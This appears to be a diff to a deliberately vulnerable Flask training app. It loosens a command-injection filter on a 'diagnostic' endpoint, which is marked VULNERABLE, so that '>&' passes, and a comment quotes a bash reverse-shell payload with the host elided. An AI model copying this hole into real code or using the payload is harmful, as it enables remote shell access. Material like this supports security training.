@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template_string, send_from_directory
+import re
 import sqlite3
 import os
 
@@ -73,7 +74,9 @@ def diagnostic():
     '''
     if request.method == 'POST':
         ip = request.form['ip']
-        if '&' in ip:
+        # Block a bare '&' (job-control backgrounding, e.g. "cmd &" or "cmd1 && cmd2"),
+        # but allow '>&'/'<&' fd-duplication syntax (e.g. "bash -i >& /dev/tcp/... 0>&1")
+        if re.search(r'(?<![><])&', ip):
             html += "<p>Invalid character in input.</p>"
             return html
         # VULNERABLE: Directly passing user input to the OS shell
